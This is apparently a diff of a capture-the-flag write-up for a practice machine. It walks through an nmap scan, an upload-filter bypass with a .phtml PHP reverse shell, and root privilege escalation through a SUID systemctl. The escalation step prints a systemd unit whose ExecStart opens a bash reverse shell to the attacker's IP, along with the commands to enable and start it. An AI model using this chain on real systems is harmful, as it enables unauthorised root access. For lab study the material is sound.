@@ -7,6 +7,7 @@ ezpz
 
 ## Task 2 - Recon
 
+classic nmap scan
 ```
 ❯ nmap -sC -sV -A 10.10.197.89
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST
@@ -54,7 +55,6 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
-
 ```
 
 ### Scan the box, how many ports are open?
@@ -65,6 +65,7 @@ Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
 
 ### How many ports will nmap scan if the flag -p-400 was used?
 `400`
+(bruh)
 
 ### Using the nmap flag -n what will it not resolve?
 `dns`
@@ -79,10 +80,64 @@ Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
 ok
 
 ## Task 3 - Locating directories using gobuster
+(have not included the gobuster scan results, since its pretty basic)
+
 ### What is the directory that has an upload form page?
-`/include/`
+`/internal/`
 
 ## Task 4 - Compromise the webserver
+We see the option to upload the files. The default way to try and upload the `phpreverseshell.php` files, but apparently `.php` is not allowed. 
+
+At this point, the room suggests using burpsuite to intercept the requests, and try out different php extensions. However, its more simple to just do it by hand :D
+
+### Run this attack, what extension is allowed?
+`phtml`
+
+Once you have the `phprevshell.phtml` uploaded, go to `/include/uploads/phprevshell.phtml` and setup netcat in parallel. Once you get in, get a proper shell by doing `python3 -c "import pty; pty.spawn('/bin/bash')`. For the next question, just do `cat /etc/passwd`.
+
+### What is the name of the user who manages the webserver?
+`bill`
+
+### What is the user flag?
+{hmmmmmmmmmmmmmmmmmmmmmmmm}
+
+## Task 5 - Priviledge Escalation
+
+> In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+
+> For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.
+
+Using the command `find`, we get:
+
+### On the system, search for all SUID files. What file stands out?
+`/bin/systemctl`
+
+### Become root and get the last flag (/root/root.txt)
+
+For this privesc, I followed [Alvin Smith's Privilege Escalation](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)
+
+Here are the steps:
+1. create a `root.service` file on your machine with the details
+```
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+```
+
+2. Using the upload option in the `/internal/` directory of the website, upload this file. It'll throw and error of the extension as not permitted. Change `root.service` to `root.phtml` (why?) and you should be good to go.
+3. In the target machine, just rename the file again.
+4. Instead of 2, 3, you can also use `nc` or any other methods you prefer.
+5. Run `/bin/systemctl enable /var/www/html/internal/uploads/root.service`
+6. Start `nc` on your machine, on the port you set in the `root.service` file in step  1 (9999 here)
+7. Run `/bin/systemctl start root.service`
+8. PWN
 
 
 ```
@@ -98,15 +153,6 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.150.214/9999 0>&1'
 
 [Install]
 WantedBy=multi-user.target
-www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable root.service
-<r/www/html/internal/uploads$ /bin/systemctl enable             root.service 
-Failed to execute operation: No such file or directory
-www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable ./root.service
-<r/www/html/internal/uploads$ /bin/systemctl enable             ./root.service
-Failed to execute operation: Invalid argument
-www-data@vulnuniversity:/var/www/html/internal/uploads$ pwd
-pwd
-/var/www/html/internal/uploads
 www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service
 <s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service        
 Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service.
